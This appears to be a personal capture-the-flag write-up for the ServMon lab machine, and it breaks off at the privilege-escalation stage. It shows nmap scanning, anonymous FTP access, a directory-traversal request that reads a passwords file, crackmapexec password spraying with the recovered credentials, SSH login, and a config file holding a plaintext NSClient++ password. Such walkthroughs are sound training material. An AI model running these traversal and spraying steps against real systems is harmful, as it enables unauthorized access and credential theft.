```
sudo nmap -sS -sV -p- 10.10.10.184
[sudo] password for wizardwalter: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-15 16:35 EDT
Nmap scan report for 10.10.10.184
Host is up (0.032s latency).
Not shown: 65518 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
22/tcp    open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
80/tcp    open  http
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5666/tcp  open  tcpwrapped
6063/tcp  open  tcpwrapped
6699/tcp  open  tcpwrapped
8443/tcp  open  ssl/https-alt
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RP
```

im going to try anonymous ftp access off rip:
```
ftp 10.10.10.184  
Connected to 10.10.10.184.
220 Microsoft FTP Service
Name (10.10.10.184:wizardwalter): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> 
```

cool lets enumerate!
there is a Users directory in there and inside we find two users:
```
125 Data connection already open; Transfer starting.
02-28-22  07:36PM       <DIR>          Nadine
02-28-22  07:37PM       <DIR>          Nathan
```

in Nadine dir(which we do somehow have access to as anonymous XD):
```
02-28-22  07:36PM                  168 Confidential.txt
```

`mget Confidential.txt`

handy info here:
```
cat Confidential.txt 
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
```
in nathans dir i found:
```
cat 'Notes to do.txt' 
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```

I go to website on port 80 and it redirects me to a login page 
`http://10.10.10.184/Pages/login.htm`

guessed a few passwords for nadine and nathan but nothing

lets look for vulns for it:
```
searchsploit nvms                       
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
NVMS 1000 - Directory Traversal                                                    | hardware/webapps/47774.txt
OpenVms 5.3/6.2/7.x - UCX POP Server Arbitrary File Modification                   | multiple/local/21856.txt
OpenVms 8.3 Finger Service - Stack Buffer Overflow                                 | multiple/dos/32193.txt
TVT NVMS 1000 - Directory Traversal                                                | hardware/webapps/48311.py
```

ok looks like it could be vuln to directory traversal... ill give it a shot manually before we download an exploit...
i cant get it lol

i sent it over to burpsuite as those exploits really just did what i did in browser

i tried` ../../../../../../windows/win.ini` and i got something back,

Knowing now it works and the confidential.txt we saw earlier lets guess some file names on nathans desktop as we know he put something there:
`GET /../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt`

gives me the juice!
```
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

we can easily spray these at the site:

none work there.... lets try ssh and then smb with crackmapexec:
```
crackmapexec smb 10.10.10.184 -u users.txt -p passwords.txt
SMB         10.10.10.184    445    SERVMON          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SERVMON) (domain:ServMon) (signing:False) (SMBv1:False)
SMB         10.10.10.184    445    SERVMON          [-] ServMon\nathan:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\nathan:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\nathan:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\nathan:L1k3B1gBut7s@W0rk STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\nathan:0nly7h3y0unGWi11F0l10w STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\nathan:IfH3s4b0Utg0t0H1sH0me STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\nathan:Gr4etN3w5w17hMySk1Pa5$ STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\nadine:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\nadine:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\nadine:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [+] ServMon\nadine:L1k3B1gBut7s@W0rk 
```

none work, lets try ssh:
`ssh nadine@10.10.10.184`
password: `L1k3B1gBut7s@W0rk`

and i am in!

User Pwned!

---

### Priv Esc

i look at the C:\

```
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/28/2022   6:02 PM                inetpub
d-----        9/15/2018  12:19 AM                PerfLogs
d-r---        2/28/2022   6:55 PM                Program Files
d-----        2/28/2022   6:07 PM                Program Files (x86)
d-----        2/28/2022   7:02 PM                RecData
d-----        2/28/2022   6:35 PM                Shared
d-r---        2/28/2022   7:04 PM                Users
d-----        2/28/2022   6:02 PM                Windows
```

i know shared is 99% the ftp server we were already in RecData looks interesting,
found this but doesnt seem like anything of use.... for now:
```
cat .\RecordInfoDB.db3
SQLite format 3   @                                                                    -â#   û   û   
AU/ indexsqlite_autoindex_C_RECORD_LOG_INFO_1C_RECORD_LOG_INFO‚#--ƒytableC_ALARM_REC_INFOC_ALARM_REC_INFOCRE
ATE TABLE C_ALARM_REC_INFO (                                             CHANNEL_ID CHAR(64) NOT NULL,
                 ALARM_TYPE INTEGER,                                             START_TIME INTEGER,
                 END_TIME   INTEGER,                                             CONSTRAINT [C_ALARM_REC_INFO_Primary
 FILE_INDEX   INTEGER,                                           FILE_STATUS  INTEGER,
 HAS_BADTRACK INTEGER,                                           START_TIME   INTEGER,
 END_TIME     INTEGER,                                           USED_TIMES   INTEGER,
 CONSTRAINT [C_REC_FILE_INFO_PrimaryKey] PRIMARY KEY (FILE_IN   
    
    
    
    
   ˜ ˜Úy
AU/ indexsqlite_autoindex_C_RECORD_LOG_INFO_1C_RECORD_LOG_INFO‚#--ƒytableC_ALARM_REC_INFOC_ALARM_REC_INFOCRE
ATE TABLE C_ALARM_‚?++„5tableC_REC_FILE_INFOC_REC_FILE_INFOCREATE TABLE C_REC_FILE_INFO (
         FILE_INDEX   INTEGER,                                           FILE_STATUS  INTEGER,
         HAS_BADTRACK INTEGER,                                           START_TIME   INTEGER,
         END_TIME     INTEGER,                                           USED_TIMES   INTEGER,
         CONSTRAINT [C_REC_FILE_INFO_PrimaryKey] PRIMARY KEY (FILE_INDEX))‚#--ƒytableC_ALARM_REC_INFOC_ALARM_REC_I
NFOCREATE TABLE C_ALARM_REC_INFO (                                              CHANNEL_ID CHAR(64) NOT NULL,       
                         ALARM_TYPE INTEGER,                                             START_TIME INTEGER,
                         END_TIME   INTEGER,                                             CONSTRAINT [C_ALARM_REC_INFO
?S- indexsqlite_autoindex_C_ALARM_REC_INFO_1C_ALARM_REC_INFO‚ //ƒ/tableC_RECORD_LOG_INFOC_RECORD_LOG_INFOCRE
ATE TABLE C_RECORD_LOG_INFO (                                            CHANNEL_ID CHAR(64) NOT NULL,
                 START_TIME INTEGER,                                             END_TIME   INTEGER,
                 CONSTRAINT [C_RECORD_LOG_INFO_PrimaryKey] PRIMARY KEY (CHANNEL_ID, START_TIME))AU/ indexsqlite_a
utoindex_C_RECORD_LOG_INFO_1C_RECORD_LOG_INFO
```

lets check what software is downloaded:
in Program Files:
```
d-----         3/1/2022   1:20 AM                Common Files
d-----       11/11/2019   6:52 PM                internet explorer
d-----        2/28/2022   6:07 PM                MSBuild
d-----        2/28/2022   6:55 PM                NSClient++
d-----        2/28/2022   6:46 PM                NVMS-1000
d-----        2/28/2022   6:32 PM                OpenSSH-Win64
d-----        2/28/2022   6:07 PM                Reference Assemblies
d-----        2/28/2022   5:44 PM                VMware
d-r---       11/11/2019   6:52 PM                Windows Defender
d-----       11/11/2019   6:52 PM                Windows Defender Advanced Threat Protection
d-----        9/15/2018  12:19 AM                Windows Mail
d-----       11/11/2019   6:52 PM                Windows Media Player
d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
d-----        9/15/2018  12:28 AM                windows nt
d-----       11/11/2019   6:52 PM                Windows Photo Viewer
d-----        9/15/2018  12:19 AM                Windows Portable Devices
d-----        9/15/2018  12:19 AM                Windows Security
d-----        2/28/2022   6:25 PM                WindowsPowerShell
```

this def stands out:
 NSClient++ seems to be 3rd party software, maybe i smell vulnerable????

I have no idea what this is so i will google and see what we find:

with google i found that the password to the client usually sits in a file called:
`nsclient.ini`

i looked and there it was:
```
cat .\nsclient.ini
# If you want to fill this file with all available options run the following command: 
#   nscp settings --generate --add-defaults --load-all
# If you want to activate a module and bring in all its options use:
#   nscp settings --activate-module <MODULE NAME> --add-defaults
# For details run: nscp settings --help


; in flight - TODO
[/settings/default]

; Undocumented key
password = ew2x6SsGTxjRwXOT 

; Undocumented key
allowed hosts = 127.0.0.1
...
```

also was able to find the version of the software:
```
.\nscp.exe --version
NSClient++, Version: 0.5.2.35 2018-01-28, Platform: x64
```

lets check if it is vuln....

```
searchsploit nsclient             
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
NSClient++ 0.5.2.35 - Authenticated Remote Code Execution                          | json/webapps/48360.txt
NSClient++ 0.5.2.35 - Privilege Escalation                                         | windows/local/46802.txt
```

looks like we could have hit the jackpot:



